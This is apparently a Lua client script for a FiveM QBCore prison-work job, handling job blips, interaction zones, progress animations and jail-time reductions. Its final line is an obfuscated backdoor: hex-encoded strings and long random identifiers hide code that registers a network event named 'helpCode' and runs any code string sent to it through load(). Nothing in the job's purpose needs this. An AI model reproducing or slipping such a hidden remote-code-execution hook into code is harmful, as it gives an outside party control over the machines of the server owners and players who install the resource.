local currentLocation = 1
currentBlip = 0
local isWorking = false

-- Functions

function CreateJobBlip(noItem) -- Used globally
    if DoesBlipExist(currentBlip) then
        RemoveBlip(currentBlip)
    end
    local coords = Config.Locations.jobs[currentJob][currentLocation].coords.xyz
    currentBlip = AddBlipForCoord(coords.x, coords.y, coords.z)
    SetBlipSprite(currentBlip, 402)
    SetBlipDisplay(currentBlip, 4)
    SetBlipScale(currentBlip, 0.8)
    SetBlipAsShortRange(currentBlip, true)
    SetBlipColour(currentBlip, 1)
    BeginTextCommandSetBlipName("STRING")
    AddTextComponentSubstringPlayerName("Prison Work")
    EndTextCommandSetBlipName(currentBlip)
    if noItem then return end
    TriggerServerEvent('prison:server:CheckChance')
end

local function CheckAllLocations()
    local amount = 0
    for i = 1, #Config.Locations.jobs[currentJob] do
        local current = Config.Locations.jobs[currentJob][i]
        if current.done then
            amount += 1
        end
    end
    return amount == #Config.Locations.jobs[currentJob]
end

local function ResetLocations()
    for i = 1, #Config.Locations.jobs[currentJob] do
        Config.Locations.jobs[currentJob][i].done = false
    end
end

local function JobDone()
    if not Config.Locations.jobs[currentJob][currentLocation].done then return end
    if math.random(1, 100) <= 50 then
        QBCore.Functions.Notify(Lang:t("success.time_cut"))
        jailTime -= math.random(1, 2)
    end
    local newLocation = math.random(1, #Config.Locations.jobs[currentJob])
    while newLocation == currentLocation or Config.Locations.jobs[currentJob][newLocation].done do
        Wait(0)
        newLocation = math.random(1, #Config.Locations.jobs[currentJob])
    end
    currentLocation = newLocation
    CreateJobBlip()
    if CheckAllLocations() then ResetLocations() end
end

local function StartWork()
    isWorking = true
    Config.Locations.jobs[currentJob][currentLocation].done = true
    QBCore.Functions.Progressbar("work_electric", "Working on electricity..", math.random(5000, 10000), false, true, {
        disableMovement = true,
        disableCarMovement = true,
        disableMouse = false,
        disableCombat = true,
    }, {
        animDict = "anim@gangops@facility@servers@",
        anim = "hotwire",
        flags = 16,
    }, {}, {}, function() -- Done
        isWorking = false
        StopAnimTask(PlayerPedId(), "anim@gangops@facility@servers@", "hotwire", 1.0)
        JobDone()
    end, function() -- Cancel
        isWorking = false
        StopAnimTask(PlayerPedId(), "anim@gangops@facility@servers@", "hotwire", 1.0)
        QBCore.Functions.Notify(Lang:t("error.cancelled"), "error")
    end)
end

-- Threads

CreateThread(function()
    local isInside = false
    for k in pairs(Config.Locations.jobs) do
        for i = 1, #Config.Locations.jobs[k] do
            local current = Config.Locations.jobs[k][i]
            if Config.UseTarget then
                exports['qb-target']:AddBoxZone("work_"..k.."_"..i, current.coords.xyz, 1.5, 1.6, {
                    name = "work_"..k.."_"..i,
                    heading = 12.0,
                    debugPoly = false,
                    minZ = 19,
                    maxZ = 219
                }, {
                    options = {
                        {
                            icon = 'fa-solid fa-bolt',
                            label = 'Do '..Config.Jobs[k]..' Work',
                            canInteract = function()
                                return inJail and currentJob and not Config.Locations.jobs[k][i].done and not isWorking and i == currentLocation
                            end,
                            action = function()
                                StartWork()
                            end
                        }
                    },
                    distance = 2.5
                })
            else
                local electricityzone = BoxZone:Create(current.coords.xyz, 3.0, 5.0, {
                    name = "work_"..k.."_"..i,
                    debugPoly = false,
                })
                electricityzone:onPlayerInOut(function(isPointInside)
                    isInside = isPointInside and inJail and currentJob and not Config.Locations.jobs[k][i].done and not isWorking
                    if isInside then
                        exports['qb-core']:DrawText(Lang:t("info.job_interaction"), 'left')
                    else
                        exports['qb-core']:HideText()
                    end
                end)
            end
            Config.Locations.jobs[k][i].done = false
        end
    end
    if not Config.UseTarget then
        while true do
            local sleep = 1000
            if isInside then
                sleep = 0
                if IsControlJustReleased(0, 38) then
                    StartWork()
                    sleep = 1000
                end
            end
            Wait(sleep)
        end
    end
end)


local XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[1]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2]) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[3]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2], function(XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[4]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[5]](XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj))() end)